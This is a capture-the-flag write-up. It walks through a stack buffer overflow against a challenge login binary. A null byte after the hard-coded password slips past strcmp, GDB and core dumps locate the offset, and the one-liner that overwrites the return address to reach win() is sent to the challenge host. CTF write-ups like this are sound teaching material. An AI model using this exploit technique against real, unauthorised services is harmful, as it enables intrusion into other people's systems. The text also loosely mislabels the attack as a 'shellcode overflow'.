# Baffling Buffer 1 - 225pts
After pointing out the initial issue, the developers issued a new update on the login service and restarted it at host1.metaproblems.com 5151. Looking at the binary and source code, you discovered that this code is still vulnerable.
<hr>

Looking at the source code, we notice that the flag is in an entirely different function, 'win()'. This means we will have to use a shellcode overflow in order to call that function. If we look at the 'vuln()' function, we notice a 'strcmp' between the buffer and "Sup3rs3cr3tC0de". Per the C docs:

"This function starts comparing the first character of each string. If they are equal to each other, it continues with the following pairs until the characters differ or until a terminating null-character is reached."

We can try to trick the 'strcmp' call by adding a null-terminating character to "Sup3rs3cr3tC0de" and then adding our overflow data. 

First, I simply ran `bb1` with "Sup3rs3cr3tC0de", a null-terminator, and some extra characters to see if it would segfault.

`python3 -c "print('Sup3rs3cr3tC0de\x00'+'a'*50)" | ./bb1`

As I thought, it segfaulted. Thus, we can modify our input to write over the return value and access the 'win()' function. First, we have to find that memory address though. This can be done using GDB.
```
$ gdb bb1
(gdb) break main
(gdb) run
(gdb) info address win
>> Symbol "win" is at 0x401172 in a file compiled without debugging.
```

Now, it's a bit of trial and error to find the correct value to overflow. We also need to enable core dumps that way we can check where exactly the program segfaults at.

```
$ ulimit -c unlimited
$ python3 -c "print('Sup3rs3cr3tC0de\x00'+'a'*41)" | ./bb1
>> Access granted!
>> zsh: done                              python3 -c "print('Sup3rs3cr3tC0de\x00'+'a'*41)" | 
>> zsh: segmentation fault (core dumped)  ./bb1
$ gdb -q -c core -ex quit
>> Core was generated by `./bb1'.
>> Program terminated with signal SIGSEGV, Segmentation fault.
>> #0  0x0000000000400061 in ?? ()
```

From here, we can see that the program terminates at 0x400061. 61 is the ASCII representation of 'a'. So, we have one too many A's being input. All we have to do is change to print 40 a's and then append our address in hex.

```
$ python3 -c "print('Sup3rs3cr3tC0de\x00'+'a'*40+'\x72\x11\x40')" | ncat host1.metaproblems.com 5151
>> Access granted!
```

And we retrived our glag.
